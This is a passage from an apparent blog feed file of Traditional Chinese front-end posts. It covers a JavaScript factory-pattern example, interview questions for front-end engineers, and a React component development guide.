class="title class_ inherited__">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(license, volume);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = <span class="string">&quot;sym&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KymcoMotor</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(license, volume);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = <span class="string">&quot;Kymco&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 定義品牌工廠</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SymMotorFactory</span> &#123;</span><br><span class="line">  <span class="title function_">createMotor</span>(<span class="params">volume</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SymMotor</span>(<span class="string">&quot;green&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (volume &lt; <span class="number">150</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SymMotor</span>(<span class="string">&quot;white&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KymcoMotorFactory</span> &#123;</span><br><span class="line">  <span class="title function_">createMotor</span>(<span class="params">volume</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KymcoMotor</span>(<span class="string">&quot;green&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (volume &lt; <span class="number">150</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KymcoMotor</span>(<span class="string">&quot;white&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立工廠物件</span></span><br><span class="line"><span class="keyword">const</span> symMotorFactory = <span class="keyword">new</span> <span class="title class_">SymMotorFactory</span>();</span><br><span class="line"><span class="keyword">const</span> kymcoMotorFactory = <span class="keyword">new</span> <span class="title class_">KymcoMotorFactory</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立抽象工廠 (代工廠)</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">motorFactory</span> = (<span class="params">&#123; brand, volume &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (brand === <span class="string">&quot;sym&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> symMotorFactory.<span class="title function_">createMotor</span>(volume);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (brand === <span class="string">&quot;kymco&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> kymcoMotorFactory.<span class="title function_">createMotor</span>(volume);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 讓代工廠進行製造</span></span><br><span class="line"><span class="keyword">const</span> symMotorGreenLicense = <span class="title function_">motorFactory</span>(&#123; <span class="attr">brand</span>: <span class="string">&quot;sym&quot;</span>, <span class="attr">volume</span>: <span class="number">50</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> kymcoMotorGreenLicense = <span class="title function_">motorFactory</span>(&#123; <span class="attr">brand</span>: <span class="string">&quot;kymco&quot;</span>, <span class="attr">volume</span>: <span class="number">50</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> symMotorWhiteLicense = <span class="title function_">motorFactory</span>(&#123; <span class="attr">brand</span>: <span class="string">&quot;sym&quot;</span>, <span class="attr">volume</span>: <span class="number">125</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symMotorGreenLicense);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symMotorWhiteLicense);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(kymcoMotorGreenLicense);</span><br></pre></td></tr></table></figure><p>程式執行結果</p><blockquote><p>SymMotor {license: ‘green’, volume: 50, brand: ‘sym’}<br>SymMotor {license: ‘white’, volume: 125, brand: ‘sym’}<br>KymcoMotor {license: ‘green’, volume: 50, brand: ‘Kymco’}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面試前端，你還有什麼問題想問嗎</title>
      <link href="/2023/01/26/career/what-questions-should-you-ask-the-interviewer/"/>
      <url>/2023/01/26/career/what-questions-should-you-ask-the-interviewer/</url>
      
        <content type="html"><![CDATA[<p>在新鮮人階段時，通常不太確定面試可以問什麼或該問什麼，當面試到最後被問起:「你還有什麼問題想問嗎?」又該怎麼回答?</p><blockquote><p>隨著職涯的發展，這個問題終究是回到自身想要成為什麼樣的大人?</p></blockquote><p>對於個人來說，面試的目標是要找到不討厭、別人願意付錢請我們做、我們可能也做得不錯的事情。</p><h2 id="面試前端，你還有什麼問題想問嗎"><a href="#面試前端，你還有什麼問題想問嗎" class="headerlink" title="面試前端，你還有什麼問題想問嗎?"></a>面試前端，你還有什麼問題想問嗎?</h2><p>在面試過程除了被面試其實也在面試團隊跟公司，而一個好的問題可以幫助我們從更多面向去了解這間公司工作樣貌，進而去看看公司有沒有符合想要的職涯目標、工作型態。</p><p>扣掉找新人<del>免洗的</del>狀況，大部分的公司都是遇到問題才會徵才，單純擴編的狀況可能並不多，而企業目前的問題<strong>很可能是造成前一位員工離職的原因之一</strong>。</p><p>在轉職時，要怎麼知道接下來是不是想要體驗這樣的職涯環境? 或著說工作樣貌是不是自己喜歡的?</p><p>之前小編收到 Open Career 的邀請，把這篇文章錄成 Podcast，在這兩集訪談的節目中會提到:</p><ul><li>過去在不同專案中遇到了哪些問題</li><li>哪種工作模式可能是讓某個人離職的原因?</li><li>哪種職務內容需要你有越級打怪的實力?</li><li>在傳統大企業和新創寫程式會遇到什麼不同的挑戰?</li><li><del><strong>避免再度中槍</strong></del>轉職面試時又該多問些什麼?</li></ul><iframe style="border-radius:12px" src="https://open.spotify.com/embed/episode/2ZoETkf4dL6P4ipXKmqcI2?utm_source=generator&theme=0" width="100%" height="152" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe><iframe style="border-radius:12px" src="https://open.spotify.com/embed/episode/2VtekkwgFBcxTgg4alCIUE?utm_source=generator&theme=0" width="100%" height="152" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe><h2 id="前端面試可以反問的-8-個問題"><a href="#前端面試可以反問的-8-個問題" class="headerlink" title="前端面試可以反問的 8 個問題"></a>前端面試可以反問的 8 個問題</h2><blockquote><p>致那些年我踩過的坑，也預祝大家在新的一年填坑大吉</p></blockquote><p>小編是前端工程師，決定在工作一年左右轉換的原因可以參考小編<a href="https://linyencheng.github.io/2021/01/26/thinking-retrospective-me/">談談選擇前端的理由</a>這篇文章。</p><p>前端通常是在設計、後端都完成後才進行收尾，收尾的同時也在幫規格、設計、後端 Debug，所以大家在大聊一波慶祝工作完成的同時，我們會發現只剩前端還在工作。</p><p>接下來會從小編當前端工程師過往遭遇的問題和解法反思未來職涯疑問，就讓我們一起看下去。</p><h3 id="面試現象中的常見地雷"><a href="#面試現象中的常見地雷" class="headerlink" title="面試現象中的常見地雷"></a>面試現象中的常見地雷</h3><ul><li>面試遲到讓面試者等</li><li>問很多跟工作無關的問題，有女朋友? 結婚有小孩了沒?</li><li>請我們又多填一份跟 104 一樣的履歷表</li><li>面試沒問太多技術問題都在聊天</li><li>很急著壓報到時間，燙手山芋正在快速拋接中</li><li>試用期砍薪水，過了還不一定會調整</li></ul><p>不過這邊想要特別說明一下，我朋友在面試的時候很誠實跟主管說接下來的目標是交女朋友工作什麼的都是浮雲，而老闆不管在面試時或是面試結束後也給了很多機會，這邊不得不感謝那個問了問題後有協助處理的老闆。</p><h3 id="是否有遇過常改規格的情境-工程師會需要如何應對"><a href="#是否有遇過常改規格的情境-工程師會需要如何應對" class="headerlink" title="是否有遇過常改規格的情境? 工程師會需要如何應對?"></a>是否有遇過常改規格的情境? 工程師會需要如何應對?</h3><blockquote><p>常改規格並沒有不好，要看的是有沒有體驗到好的軟體開發流程，目標是確認公司開發流程是不是下一份工作的目標，像是有分測試和正式環境嗎? 上版本遇到 bug 會在什麼時候修?</p></blockquote><ul><li>常依需求修改資料庫 Schema 或 API，每次都要重寫邏輯以及資料庫互動的部分<ul><li>需要常常顯示不同的統計，可考慮導入 GraphQL 從 Client 決定，減少開 API 的時間</li><li>使用 Document-Oriented 的資料庫，POC 階段相對簡單</li></ul></li><li>隕石式開發，主事者看到畫面後覺得還想改就又重來一次<ul><li>出 Mockup 或是設計製作不須切版的假畫面流程</li><li>出一個 Demo 用的 Prototype (處理關鍵流程，不須注重美觀) 讓不熟網頁開發的主事者了解目前的狀況和方向，確認後才進行設計切圖、前端切版、後端開 API</li></ul></li></ul><h3 id="通常是怎麼處理樣式檔-像是-BEM-或依元件或頁面開檔案放置"><a href="#通常是怎麼處理樣式檔-像是-BEM-或依元件或頁面開檔案放置" class="headerlink" title="通常是怎麼處理樣式檔? 像是 BEM 或依元件或頁面開檔案放置?"></a>通常是怎麼處理樣式檔? 像是 BEM 或依元件或頁面開檔案放置?</h3><blockquote><p>是不是可以在這樣的專案架構下學到東西</p></blockquote><p>CSS 選擇器和規則們就像女孩化妝桌上的化妝品們，桌上總是放著各個種類，數也數不清大罐小罐擠的噴的擦的，在沒有預備知識和整理規劃的情況下，若要一個男孩子短時間搞清楚簡直是天方夜譚。</p><p>該怎麼透過 CSS 的架構來優化，可以參考之前小編寫的如何 <a href="https://linyencheng.github.io/2022/09/07/relationships-between-frontend-and-backend/css-design-pattern-with-bem-smacss-oocss-atomic-css/">透過 BEM、SMACSS、OOCSS、Atomic CSS 簡化樣式開發流程、減少維護成本</a>。</p><ul><li>撰寫地圖專用的圖層 SLD 樣式檔 (類似 XML) 超過一萬行<ul><li>官方有介紹使用 CSS 的寫法，運用 Class 共用的特性可讓行數減少</li></ul></li><li>樣式檔沒有寫在元件中，也沒使用預 (後) 處理器，上千行的樣式檔搜尋 <code>.user-photo</code> 也許有十幾個結果<ul><li>樣式需要有命名規則 (BEM)</li><li>導入 SCSS</li></ul></li></ul><h3 id="目前公司有幾位設計，是怎麼合作的"><a href="#目前公司有幾位設計，是怎麼合作的" class="headerlink" title="目前公司有幾位設計，是怎麼合作的?"></a>目前公司有幾位設計，是怎麼合作的?</h3><blockquote><p>希望可以看出現在的專案是不是好維護，打聽一下工作流程或是有沒有 Design Guideline 或使用 Zeplin 或 figma 這類工具</p></blockquote><ul><li>同樣功能的圖片大小長寬比不一<ul><li><code>object-fit</code></li><li><code>background-size: cover</code></li><li>重新切圖</li></ul></li><li>拿到檔名是 123543.jpg 大小超過 10 MB<ul><li>請設計壓縮一下</li><li>小於 5MB 可使用 TinyPNG</li></ul></li><li>設計沒有考慮到字數過多的情境，導致上字詞之後與預期狀況不符<ul><li><code>overflow: hidden</code></li><li>改設計</li></ul></li></ul><h3 id="請問會需要整合不同的後端嗎"><a href="#請問會需要整合不同的後端嗎" class="headerlink" title="請問會需要整合不同的後端嗎?"></a>請問會需要整合不同的後端嗎?</h3><blockquote><p>評估自己的能力有沒有辦法處理</p></blockquote><p>會需要串接不同網域的後端</p><ul><li>使用 Nginx Proxy</li><li>改成在後端才打 API</li><li>後端開放 Domain 解決 CORS</li></ul><p>不同 API 的配置大多不太一樣</p><ul><li>Token 都移到 Cookie，這樣相關的 Token 會自動送回相關子網域的 API</li><li>善用客製化後的 Axios Instance</li></ul><h3 id="專案中有用到哪些設計模式"><a href="#專案中有用到哪些設計模式" class="headerlink" title="專案中有用到哪些設計模式?"></a>專案中有用到哪些設計模式?</h3><blockquote><p>看現在的老闆或是同事是怎麼看待問題或是歷史遺跡</p></blockquote><p>什麼是 Pattern，Pattern 就是改善如何去架構程式的方法，主要是讓程式碼能夠在元件間共用。</p><ul><li>用 Java 的概念寫 Javascript，有非常多的 Prototype 的寫法，文件不清楚的情況下，導致實作上每次都需要追本溯源的看，考驗搜尋或是編輯器的能力<ul><li>使用 Component-Base 的函式庫或框架，並建立故事書</li><li>善用設計模式，<a href="https://linyencheng.github.io/2023/01/25/react/react-component-pattern-and-development-guide/">React 常見的 Component Pattern</a> 就是 HOC 或是 Render Props</li></ul></li></ul><h3 id="專案的時程會很趕嗎-當工程師遇到困難時，會如何協助解決"><a href="#專案的時程會很趕嗎-當工程師遇到困難時，會如何協助解決" class="headerlink" title="專案的時程會很趕嗎? 當工程師遇到困難時，會如何協助解決?"></a>專案的時程會很趕嗎? 當工程師遇到困難時，會如何協助解決?</h3><blockquote><p>如果老闆只剩下壓時程的功能，那是不是我們用個鬧鐘或是 Google Calendar 就好了</p></blockquote><p>主管可能不懂前端並無解決問題或協調資源的能力，只剩壓時程及提出需要限時解決</p><ul><li>提早尋求同事協助，並看價值觀是否願意加班解決</li><li>時間給的不夠屬於管理上的問題，無法靠溝通解決就盡快重新找工作</li></ul><h3 id="如果有十幾個需求同時開發或是需要轉換框架函式庫，會怎麼進行"><a href="#如果有十幾個需求同時開發或是需要轉換框架函式庫，會怎麼進行" class="headerlink" title="如果有十幾個需求同時開發或是需要轉換框架函式庫，會怎麼進行?"></a>如果有十幾個需求同時開發或是需要轉換框架函式庫，會怎麼進行?</h3><blockquote><p>要看的是與歷史共業的生存法則與態度</p></blockquote><p>不同的產業別都會有歷史的包袱 (Workaround)，可能還是會用一些比較舊的東西。</p><p>除了東西較舊也可能遇到專案架構及程式混亂，這有點像是煉蠱的過程，看最後誰會生存下來。</p><ul><li>專案在後期才考慮要加入 i18n 或伺服器渲染<ul><li>React 本身是一套過於單純的函式庫，容易且戰且走<del>疊床架屋</del>，建議可以參考 Next.js Repo 中的 Example</li></ul></li><li>趕時程但又好又快又便宜無法共存，專案中可能滿滿的 Workaround，像資料來源用 Google Sheet<ul><li>留下 <code>// TODO:</code> 及未來可改善方向</li></ul></li><li>同樣一種功能有多種寫法或是 Deprecated 的寫法<ul><li>討論用哪種方法好，有時間就盡快合併，讓程式碼更好維護</li><li>尋找 Deprecated 寫法的替代方案</li></ul></li></ul><h3 id="會在什麼時候決定將共用邏輯抽取出來成為-function-或是常數"><a href="#會在什麼時候決定將共用邏輯抽取出來成為-function-或是常數" class="headerlink" title="會在什麼時候決定將共用邏輯抽取出來成為 function 或是常數?"></a>會在什麼時候決定將共用邏輯抽取出來成為 function 或是常數?</h3><blockquote><p>炫技跟過度結構化並不會讓專案變得更健康</p></blockquote><ul><li>一層又一層的 HOC 封裝<ul><li>HOC 像是一個工廠，把原來的元件變身或加強，所以不建議包太多層</li></ul></li><li>過度或是過早的結構化，很簡單的功能卻太早預想會變成大專案</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getSQL</span>(<span class="params">strSQL</span>) &#123;</span><br><span class="line">  <span class="comment">// 覺得這裡之後會加上資料處理</span></span><br><span class="line">  <span class="keyword">return</span> strSQL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡有兩個觀念想要分享給大家，YAGNI 和 RUDT</p><p>YAGNI (You Ain’t Gonna Need It.)</p><ul><li>真的需要使用 XX 模式嗎？</li><li>真的需要拆分成小元件嗎？</li><li>真的需要切成一堆小介面和抽象類別嗎？</li></ul><p>RUDT</p><ul><li>Read: 最短的時間、最少的檔案</li><li>Update: CRUD features 時可以用最小成本去改</li><li>Debug: 菜鳥工程師也可以很快找到根本問題</li><li>Test: 問題、結果都可以容易被複製被測試 (資料面像是抽獎時該怎麼辦?)</li></ul><h2 id="透過問題了解面試官和團隊"><a href="#透過問題了解面試官和團隊" class="headerlink" title="透過問題了解面試官和團隊"></a>透過問題了解面試官和團隊</h2><p>同場加映四個問題，來自 Medium 的 <a href="https://medium.com/@lucychang_11167/what-questions-should-you-ask-the-interviewers-8de1441a4f1">what questions should you ask the interviewers</a>。</p><h3 id="您的工作上一天大概是怎麼過的"><a href="#您的工作上一天大概是怎麼過的" class="headerlink" title="您的工作上一天大概是怎麼過的?"></a>您的工作上一天大概是怎麼過的?</h3><p>這題是開放式的問題，目標是希望可以聽到一些工作型態。</p><p>有些面試官可能會說公司通常是早上八點半上班到晚上六點，有些面試官可能會說我們公司跑 Scrum 每天早上會有站會，偶而晚上會跟其他國家同事開會。</p><p>藉由這個問題，你大概就能夠了解如果進入這間公司，你大概會過怎麼樣的生活。</p><p>延伸的問題可能會是趁機問一下加班、出差的頻率，或是任何你對工作型態的好奇。</p><h3 id="最喜歡和最不喜歡這個團隊或公司的地方是什麼"><a href="#最喜歡和最不喜歡這個團隊或公司的地方是什麼" class="headerlink" title="最喜歡和最不喜歡這個團隊或公司的地方是什麼?"></a>最喜歡和最不喜歡這個團隊或公司的地方是什麼?</h3><p>第一個部分通常是簡單的，但其實真正有趣的會是第二個部分。</p><p>面試官通常在有 HR 的場合會講不出來，甚至只會模糊的打官腔，可能會有面試官回答說，我不太喜歡頻率太高的會議或是一直在不同的產品中轉換。</p><p>最主要的目的是，透過這些回答，我們可以去延伸一些後面的問題，甚至我們可以只是單純再問說哇那到底是有多討厭多不喜歡，即便我們不會得到直接的答案或是他們真的不喜歡的地方，但我們仍舊能從這些回答中得到些蛛絲馬跡和感受，也許這些感受剛好也會是你在意的。</p><h3 id="這個團隊接下來的目標是什麼"><a href="#這個團隊接下來的目標是什麼" class="headerlink" title="這個團隊接下來的目標是什麼?"></a>這個團隊接下來的目標是什麼?</h3><p>這個問題很適合問團隊主管，至少在決定加入這間公司前，可以知道自己未來兩到三年大概能有什麼樣的成長。</p><p>這個問題可以幫助我們了解這個團隊是否在成長中，若是正在成長是不是有一個規劃好的計畫藍圖? 如果是的話，就可以評估我們的戰力是否可以協助公司推進。</p><p>那如果是一個穩定的團隊，只是做一些日常維護的工作，那該問自己的問題可能會是這是我們這個階段想要追求的嗎?</p><h3 id="請問您通常都是怎麼帶領團隊"><a href="#請問您通常都是怎麼帶領團隊" class="headerlink" title="請問您通常都是怎麼帶領團隊?"></a>請問您通常都是怎麼帶領團隊?</h3><p>主管的帶領風格會對你接下來工作的成就和快樂有非常大的影響，藉由這個問題，你也許可以知道主管的管理程度，也許有些會說他們做微管理，有些也許會說只需要你一周寫一次週報。</p><p>從回答中，你可以判斷這個主管的個性是不是適合你，提早了解這些層面會比進去之後後悔要來的更好。</p><p>最後，如果有什麼問題或想討論的東西，歡迎寄信到這裡 <a href="mailto:linyencheng.tw@gmail.com">linyencheng.tw@gmail.com</a> 跟我聊聊，或是到粉專<a href="https://www.facebook.com/linyencheng.tw">前端三分鐘</a>幫忙按個讚直接訊息我也很歡迎 :)</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 元件開發指南</title>
      <link href="/2023/01/25/react/react-component-pattern-and-development-guide/"/>
      <url>/2023/01/25/react/react-component-pattern-and-development-guide/</url>
      
        <content type="html"><![CDATA[<p>以 React 來說，要寫出一個元件有 <code>Class-based</code> 或是 <code>Functional</code> 兩種方式，兩者之中 Functional 寫法較為簡單且透過 Hook Pattern 能輕易將資料邏輯與顯示分離，長期來看透過 <code>Functional</code> 的方式會更容易去維護和重構。</p><p>參考文章: <a href="https://linyencheng.github.io/2020/02/02/react-component-class-based-vs-functional/">從特性淺談 React Class-based 和 Functional Component 兩種寫法之異同</a></p><p>在軟體或是元件開發上，我們需要考量：</p><ul><li>可維護性</li><li>可讀可理解性</li><li>可靠性：出現錯誤還是可以繼續工作</li></ul><p>對於初學者來說，小編是推薦直接學習 Functional Component 並且搭配 Hook Pattern、HOC Pattern 和 Render Props Pattern 進行學習。</p><h2 id="元件開發指南"><a href="#元件開發指南" class="headerlink" title="元件開發指南"></a>元件開發指南</h2><p>透過 React.js 這個 component-based 的函式庫進行前端開發，我們會更專注在：</p><ul><li>開發可重用的元件</li><li>使用別人開發好的元件</li></ul><p>首先先推薦這個 <a href="https://github.com/brillout/awesome-react-components">Github Repo 整理厲害的函式庫們</a>，可以點進去觀賞一下。</p><p>接下來直接看程式碼，範例為 Input 基本元件，從行數上看 <code>Functional</code> 的方式行數縮減不少。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class-based</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Input</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">input</span>: <span class="string">&quot;&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleInput</span> = <span class="variable language_">this</span>.<span class="property">handleInput</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleInput</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">input</span>: e.<span class="property">target</span>.<span class="property">value</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;handleInput&#125;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.input&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Functional</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Input</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [input, setInput] = <span class="title class_">React</span>.<span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;(e)</span> =&gt;</span> setInput(e.target.value)&#125; value=&#123;input&#125; /&gt;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比起自己開發，我們更常去使用別人開發好的元件，底下是一些使用現有元件注意事項:</p><ul><li>無障礙支援程度 (A11y)</li><li>樣式是否方便客製化來配合目前網站視覺</li><li>文件是否詳細</li><li>瀏覽器支援</li><li>看一下目前的 issue</li><li>更新的速度</li><li>Release Note 是否詳細</li></ul><h3 id="元件樣式"><a href="#元件樣式" class="headerlink" title="元件樣式"></a>元件樣式</h3><p>靜態樣式的處理，傳統的 <code>css</code> 或是 <code>scss</code> 的寫法，比較適合整體 Layout 相關</p><ul><li>若在新增元件的同時寫樣式檔，在元件重構或移動時會需要較多的確認與步驟</li><li>樣式檔本身是 global 的，會需要一個團隊都能遵守的命名規則</li></ul><p>當我們需要用程式去控制動態樣式，我們可以透過以下的方式處理</p><ul><li>Inline style</li><li>classnames 去操作動態樣式</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">SubmitButton</span>(<span class="params">&#123; isHidden &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> btnSummitClass = <span class="title function_">classNames</span>(&#123;</span><br><span class="line">    <span class="attr">btn</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;btn-default&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;cursor--not-allowed&quot;</span>: isHidden,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> styleButton = &#123; <span class="attr">display</span>: isHidden ? <span class="string">&quot;none&quot;</span> : <span class="string">&quot;block&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">className</span>=<span class="string">&#123;btnSummitClass&#125;</span> <span class="attr">style</span>=<span class="string">&#123;styleButton&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">SkillChart</span> <span class="attr">nowProfile</span>=<span class="string">&#123;nowProfile&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS-in-JS"><a href="#CSS-in-JS" class="headerlink" title="CSS in JS"></a>CSS in JS</h3><p>CSS in JS 解決了 CSS 命名的問題。</p><p>由於 component-based 的概念興起元件開發成為顯學，CSS in JS 提供了將樣式寫在元件中解決方案，也讓 CSS 需要從寫程式語言的角度去進行架構設計。</p><p>CSS in JS 不僅降低了維護難度也加速了開發速度，減少檔案切換和減少 class 命名錯誤等等問題，小編之前介紹過一篇 <a href="https://linyencheng.github.io/2022/09/10/relationships-between-frontend-and-backend/css-in-js-with-reactjs/">CSS in JS</a> 的文章，歡迎大家去看看。</p><p>常見的 library 像是 css module、vanilla-extract、styled-components、styled-jsx (Next.js) 都非常好上手，更完整的將元件模組化並增加可重用性。</p><h3 id="Storybook-js"><a href="#Storybook-js" class="headerlink" title="Storybook.js"></a>Storybook.js</h3><p>利用套件將元件獨立進行開發與測試，這樣的套件提供了一個 Living Document 而且會馬上同步元件原始碼的更動。</p><p>並且透過可以 Demo 的 Web GUI 可以讓剛開始接觸專案的開發人員更快速的了解系統中元件的使用方法，以下為常看見的兩套工具。</p><ul><li><a href="https://www.docz.site/">https://www.docz.site/</a></li><li><a href="https://storybook.js.org/">https://storybook.js.org/</a></li></ul><p>小編這裡推薦 Storybook.js，透過故事書與內建的 plugin 幾乎是可以只寫好 config 就能夠直接使用。</p><p>使用故事書獨立開發可能需要注意的事項</p><ul><li>Promise 取代 http request</li><li>使用 setTimeout 模擬一些需要時間的動作</li><li>列出所有可能的狀態</li><li>利用 knobs 方便進行測試</li><li>專案架構上可以盡量把故事跟元件放近一點，減少找來找去</li></ul><h2 id="React-Component-Pattern"><a href="#React-Component-Pattern" class="headerlink" title="React Component Pattern"></a>React Component Pattern</h2><p>什麼是 Pattern，Pattern 就是改善如何去架構程式的方法，React 常見的 Component Pattern 主要是讓程式碼能夠在元件間共用。</p><p>常見的三種 Pattern 為</p><ul><li>HOC Pattern</li><li>Render Props Pattern</li><li>Hooks Pattern</li></ul><h3 id="HOC-Pattern"><a href="#HOC-Pattern" class="headerlink" title="HOC Pattern"></a>HOC Pattern</h3><p>類似 higher-order function (HOF) 接受一個或多個 function 作為輸入最後輸出一個 function 的概念，higher-order component (HOC) 會接受 component 作為輸入後輸出一個新的 component。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">EnhancedComponent</span> = <span class="title function_">withHigherOrderComponent</span>(<span class="title class_">WrappedComponent</span>);</span><br></pre></td></tr></table></figure><p>通常會取名為 with 開頭，缺點是如果同一個元件會需要多個功能就會一層包一層，小編以前就遇過包了四五層的，命名規則還有功能切割不夠好的話其實有點難 debug。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;withGA&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span 